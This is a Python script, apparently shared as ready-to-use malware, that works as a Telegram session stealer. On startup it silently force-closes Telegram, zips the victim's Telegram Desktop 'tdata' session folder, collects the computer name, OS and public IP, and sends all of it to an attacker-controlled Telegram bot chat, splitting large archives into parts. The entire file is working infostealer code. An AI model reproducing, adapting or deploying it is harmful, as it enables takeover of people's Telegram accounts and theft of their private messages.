import os
import platform
import requests
from aiogram import Bot, Dispatcher, types
from aiogram.types import InputFile
from aiogram.utils import executor
from zipfile import ZipFile
import subprocess

BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
ADMIN_ID = "ADMIN_ID_HERE"

site = 'https://api.ipify.org/?format=json'

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(bot)

def zip_folder(folder_path, zip_path):
    """Zips the specified folder."""
    with ZipFile(zip_path, 'w') as zipf:
        for root, dirs, files in os.walk(folder_path):
            for file in files:
                file_path = os.path.join(root, file)
                arcname = os.path.relpath(file_path, folder_path)
                zipf.write(file_path, arcname)

def split_file(file_path, part_size=50 * 1024 * 1023): # 50 * 1024 * 1024 = 50MB = max file size limit (error)
    """Split a file into parts if it exceeds the size limit."""
    part_files = []
    base_name, ext = os.path.splitext(file_path)
    with open(file_path, 'rb') as f:
        part_num = 1
        while True:
            chunk = f.read(part_size)
            if not chunk:
                break
            part_file = f"{base_name}_part{part_num}{ext}"
            with open(part_file, 'wb') as part_f:
                part_f.write(chunk)
            part_files.append(part_file)
            part_num += 1
    return part_files

async def on_startup(dp): # When the bot starts
    try:
        
        # You can not access tdata folder if Telegram is running,sooo
        # We will just kill Telegram process ^_^

        subprocess.run(
            ["taskkill", "/IM", "Telegram.exe", "/F"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            creationflags=subprocess.CREATE_NO_WINDOW
            )
        
        telegram_folder = os.path.expanduser('~') + r'\\AppData\\Roaming\\Telegram Desktop\\tdata'
        zip_path = os.path.expanduser('~') + r'\\AppData\\Local\\Temp\\tdata.zip'

        ip = requests.get(f'{site}').text
        os_info = f"OS: {platform.system()} {platform.release()}"
        pc_name = os.getlogin()

        info_message = (f"User cracked!\n"
                        f"PC: {pc_name}\n"
                        f"OS: {os_info}\n"
                        f"IP: {ip}")
        await bot.send_message(ADMIN_ID, info_message)

        if os.path.exists(telegram_folder):
            zip_folder(telegram_folder, zip_path)

            if os.path.getsize(zip_path) > 50 * 1024 * 1023: # If zip file is larger than 50MB, split it | or file size limit error
                part_files = split_file(zip_path)
                for part_file in part_files:
                    zip_file = InputFile(part_file)
                    await bot.send_document(ADMIN_ID, zip_file)
                    os.remove(part_file)
            else:
                zip_file = InputFile(zip_path)
                await bot.send_document(ADMIN_ID, zip_file)

            os.remove(zip_path)

    except Exception as e:
        await bot.send_message(ADMIN_ID, f"An error occurred: {e}")

@dp.message_handler(commands=['start'])
async def handle_start_command(message: types.Message):
    await message.reply("Maked by diethylmorphine.github.io !")

if __name__ == "__main__":
    executor.start_polling(dp, on_startup=on_startup, skip_updates=True)